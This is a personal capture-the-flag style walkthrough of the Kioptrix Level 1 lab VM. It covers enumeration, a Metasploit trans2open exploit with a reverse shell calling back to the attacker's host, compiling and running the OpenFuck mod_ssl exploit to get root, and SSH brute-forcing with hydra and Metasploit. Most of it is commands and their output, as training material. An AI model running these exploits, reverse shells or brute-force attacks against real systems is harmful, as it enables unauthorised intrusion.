## Kioptrix 
**Password** - TwoCows2
**Username** - john 
**Ip address** - 192.168.1.7

## Scan result of HTTP and HTTPS
![[http_https_open_ports1.png]]

## Investigating port 80 and 443

### Navigating to http and https by copy pasting ip
![[enumerating_http_https1.png]]
**Open ports** - 80, 443 - 8:10am
When we navigate to http://192.168.1.7 , then we see a web page(Default web page)
**Result** - web page runs apache. It means, it potentially runs php.

#### Some points about default web page
- If a client is running default web page, it brings two questions, are there other web directories behind and second is, where we do directory busting and attempt to find a directory

**Information Disclosure** - 404 page 
![[enumerating_http_https2.png]]
- Above tell us the version of Apache running on a server and this server hosted on localhost.

## Nikto scan result ssl vulnerability 
```bash
mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
```
**nikto scan vulnerability result saved** - ~/kioptrix/kioptrix_vulnerabilities.txt

**Directory busting** - 
Directory bursting (also known as directory brute forcing) is **a web application technology used to find and identify possible hidden directories in websites**.
This is done with the aim of finding forgotten or unsecured web directories to see if they are vulnerable to exploitation.

## Directory busting using dirb
```python
┌──(hyok㉿kali)-[~]
└─$ dirb http://192.168.1.7 /usr/share/wordlists/dirb/common.txt
```
**For more information** --> [[directory listing]]
**Hidden directories found** - 
200 status code links below
1. http://192.168.1.7/index.html
2. http://192.168.1.7/mrtg/index.html
3. http://192.168.1.7/usage/index.html

403 status code links below - 
1. http://192.168.1.7/~operator
2. http://192.168.1.7/~root
3. http://192.168.1.7/cgi-bin/

## After performing burp suite - 
![[kioptrix_server_disclosure1.png]]
**Result** - From burp suite, we get to know server version information.

## Navigating to  http://192.168.1.7/usage/index.html
### Information disclosure - 
1. **Hostname** - kioptrix.level1
2. Generated by - [Webalizer Version 2.01](http://www.mrunix.net/webalizer/)

## Doing stuffs using metasploit
### Searching for smb version scanner
```python
msf6 > search smb
```
![[kioptrix_smb_version.png]]

### Setting basic stuffs for smb version detection
```python
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > info
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7

```

**Result** - We get the version of **SMB** which is Unix (Samba 2.2.1a)

## Connecting to kioptrix SMB shares
```python
┌──(hyok㉿kali)-[~]
└─$ smbclient -L \\192.168.1.7
```
**Result** - 
```python
Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)
```

### Try connecting to ADMIN$ 
```python
┌──(hyok㉿kali)-[~]
└─$ smbclient \\\\192.168.1.7\\ADMIN$
Password for [WORKGROUP\hyok]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
```
**Result** - We are not able to connect to it because it is password protected.

### Try connecting to IPC$
```python
┌──(hyok㉿kali)-[~]
└─$ smbclient \\\\192.168.1.7\\IPC$
Password for [WORKGROUP\hyok]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
**Result** - We get access to **IPC$** share but we can't do anything like listing files. So, we move onto to SSH.

**We are able to find the below exploits from google by searching like "mod_ssl 2.8.4 exploits"**
## Exploits to exploit mod_ssl 2.8.4
1. 80/443 - Potentially vulnerable to [OpenFuck](https://www.exploit-db.com/exploits/764), and https://github.com/heltonWernik/OpenLuck 

## Exploits to exploit apache 1.3.20
apache 1.3.20 is also vulnerable to above exploits

**OpenSSL/0.9.6b is tied directly to mod_ssl, So we already find this exploits above.**

## Exploits to exploit  Unix (Samba 2.2.1a)
![[kioptrix_smb_version_exploits.png]]
139 - Potentially vulnerable to https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/, and https://www.exploit-db.com/exploits/10, https://www.exploit-db.com/exploits/7

## searching exploit-db for samba 2.2.1a exploits using searchsploit
```python
┌──(hyok㉿kali)-[~]
└─$ searchsploit samba 2.2.1a
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overfl | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execu | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow         | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```
**Note** - Remember that searchsploit search the exact string. So, it sometimes doesn't give you result but it has information.

## Kioptrix note taking example
![[kioptrix_note_taking_ex.png]]

## Gaining root with metasploit
1. Back to samba 2.2.1a
```python
┌──(hyok㉿kali)-[~]
└─$ searchsploit samba 2.2.1a  
```
**Result** - We get exploit, which is **Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)**

2. Searching for this exploit in metasploit 
```python
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
```

3. configure the exploit
```python
msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > options
msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 exploit(linux/samba/trans2open) > show targets
msf6 exploit(linux/samba/trans2open) > exploit
[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] 192.168.1.7:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.1.7
[*] 192.168.1.7 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.1.7:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.1.7
[*] 192.168.1.7 - Meterpreter session 2 closed.  Reason: Died
msf6 exploit(linux/samba/trans2open) > options
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/  
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] 192.168.1.7:139 - Trying return address 0xbffff5fc...
[*] Command shell session 5 opened (192.168.1.8:4444 -> 192.168.1.7:32773) at 2023-06-13 08:44:58 +0530
[*] Command shell session 6 opened (192.168.1.8:4444 -> 192.168.1.7:32774) at 2023-06-13 08:44:58 +0530

host[*] Command shell session 7 opened (192.168.1.8:4444 -> 192.168.1.7:32775) at 2023-06-13 08:45:04 +0530
name
kioptrix.level1
```

**Notes** -
1. above in **show targets**, we have only one target that's why we don't need this but when we have more than one target then it requires.
2. The first time we use **exploit** and it doesn't work because we use staged payload and second time we switched to non-staged payload.
3. In **set payload linux/x86/** we hit **TAB** to find correct payload(non-staged).

## Exploiting mod_ssl
1. Back to enumeration, we navigate to [openfuck](https://github.com/heltonWernik/OpenLuck ) and download this exploit.
	```python
	┌──(hyok㉿kali)-[~]
	└─$ sudo git clone https://github.com/heltonWernik/OpenFuck.git /opt/openfuck

	┌──(hyok㉿kali)-[/opt/openfuck]
	└─$ ls
	OpenFuck.c  README.md

	┌──(hyok㉿kali)-[/opt/openfuck]
	└─$ sudo apt-get install libssl-dev

	┌──(hyok㉿kali)-[/opt/openfuck]
	└─$ gcc -o OpenFuck OpenFuck.c -lcrypto

	┌──(hyok㉿kali)-[/opt/openfuck]
	└─$ ls
	OpenFuck  OpenFuck.c  README.md

	┌──(hyok㉿kali)-[/opt/openfuck]
	└─$ ./OpenFuck   
	: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)

```

2. Choosing the target:
![[openfuck1.png]]
The reason to choose this one, is just for **apache-1.3.20-16** and **RedHat Linux**.

3. Running openfuck exploit:
```python
┌──(hyok㉿kali)-[/opt/openfuck]
└─$ ./OpenFuck 0x6b 192.168.1.7 -c 40
```
**Output** - 
```python
[+] Now wait for suid shell...
whoami
root
hostname
kioptrix.level1
```

## Brute-forcing kioptrix ssh 
### 1. using hydra
```python
┌──(hyok㉿kali)-[~]
└─$ sudo hydra -l root -p /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.1.7:22 -t 4 -V                                                   

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-13 21:54:20
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.1.7:22/
[ATTEMPT] target 192.168.1.7 - login "root" - pass "/usr/share/wordlists/metasploit/unix_passwords.txt" - 1 of 1 [child 0] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-13 21:54:22
```

### 2. Using metasploit
```python
┌──(hyok㉿kali)-[~]
└─$ sudo msfconsole
msf6 > search ssh
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > options
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] 192.168.1.7:22 - Starting bruteforce
[-] 192.168.1.7:22 - Failed: 'root:admin'
[-] 192.168.1.7:22 - Failed: 'root:123456'

```

**Note** - We have set **VERBOSE** to true to see output of brute-force attempts.